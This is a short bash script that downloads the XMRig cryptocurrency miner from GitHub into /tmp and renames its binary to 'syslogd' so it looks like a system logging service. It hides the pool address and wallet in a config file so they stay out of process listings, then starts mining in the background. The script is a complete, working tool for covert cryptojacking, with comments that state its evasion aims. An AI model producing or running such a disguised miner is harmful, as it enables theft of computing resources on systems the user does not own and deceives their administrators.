#!/bin/bash

# Go to /tmp
cd /tmp

# Download latest XMRig release
LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest \
  | grep browser_download_url \
  | grep "linux-static-x64" \
  | cut -d '"' -f 4)

wget -O xmrig.tar.gz "$LATEST_URL"
tar -xf xmrig.tar.gz
XMRIG_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -n 1)
cd "$XMRIG_DIR" || exit 1

# 1. Rename the binary to mask it in process lists
mv xmrig syslogd
chmod +x syslogd

# 2. Create a JSON config file to hide arguments
# This keeps your wallet and pool out of the 'ps' command line
cat <<EOF > config.json
{
    "autosave": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "fr-salvium.miningocean.org:8462",
            "user": "8BVC25UWjNuihMfTf9RHR5lrn9FwaJEyuAmQuVjeZ8vr9MotS5HlKeERssZ9GipjqW2fS4Es5EVbnMVlMseg9mpMGwWPzhU",
            "pass": "Worker01",
            "keepalive": true,
            "tls": false
        }
    ],
    "donate-level": 1
}
EOF

echo "Starting miner as 'syslogd' using config.json..."

# 3. Start the miner using the config file
# In htop, this will only show as: ./syslogd --config=config.json
./syslogd --config=config.json >/tmp/syslogd.log 2>&1 &

echo "Process started. Details are hidden in the config file."
